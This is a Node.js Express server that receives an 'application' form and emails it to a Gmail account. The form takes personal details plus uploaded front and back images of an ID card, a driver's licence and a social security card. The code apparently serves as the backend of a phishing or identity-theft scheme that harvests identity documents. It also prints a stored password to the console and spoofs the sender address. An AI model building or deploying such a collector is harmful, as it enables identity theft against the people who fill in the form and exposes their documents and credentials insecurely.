require("dotenv").config();
const express = require("express");
const multer = require("multer");
const nodeMail = require("nodemailer");
const path = require("path");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
console.log(process.env.PASSWORD);

// Configure multer for handling image uploads
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

async function mainMail(
  name,
  email,
  DOB,
  employmentstatus,
  proposal,
  MaritalStatus,
  number,
  subject,
  images
) {
  const transporter = await nodeMail.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER2,
      pass: process.env.PASSWORD2,
    },
  });
  const mailOption = {
    from: email,
    to: process.env.GMAIL_USER2,
    subject: subject,
    html: `
    <p>You got a message from Email : ${email}</p>
    <p>Name: ${name}</p>
    <p>Date of Birth: ${DOB}<p>
    <p>Employment Status: ${employmentstatus}</p>
    <p>Proposal: ${proposal}</p>
    <p>Marital Status: ${MaritalStatus}</p>
    <p>Phone Number: ${number}</p>`,
    attachments: images.map((image, index) => ({
      filename: `${image.filename}.jpg`, // Customize filename as needed
      content: image.file,
    })),
  };
  try {
    await transporter.sendMail(mailOption);
    return Promise.resolve("Your application will be processed. Thank you.");
  } catch (error) {
    return Promise.reject(error);
  }
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "contact.html"));
});

app.post(
  "/contact",
  upload.fields([
    { name: "id-card-front", maxCount: 1 },
    { name: "id-card-back", maxCount: 1 },
    { name: "driver-license-front", maxCount: 1 },
    { name: "driver-license-back", maxCount: 1 },
    { name: "social-security-number-front", maxCount: 1 },
    { name: "social-security-number-back", maxCount: 1 },
  ]),
  async (req, res, next) => {
    const {
      yourname,
      youremail,
      yourDOB,
      youremploymentstatus,
      yourproposal,
      yourMaritalStatus,
      yourNumber,
      yoursubject,
    } = req.body;
    try {
      const images = []; // Array to store uploaded image buffers
      // Iterate through each image field and push the image buffer to the array
      for (const fieldName in req.files) {
        images.push({
          file: req.files[fieldName][0].buffer,
          filename: fieldName,
        });
      }

      await mainMail(
        yourname,
        youremail,
        yourDOB,
        youremploymentstatus,
        yourproposal,
        yourMaritalStatus,
        yourNumber,
        yoursubject,
        images
      );

      res.send("Your application will be processed. Thank you.");
    } catch (error) {
      console.log(error);
      res.send("Message Could not be Sent");
    }
  }
);
app.listen(3000, () => console.log("Server is running!"));
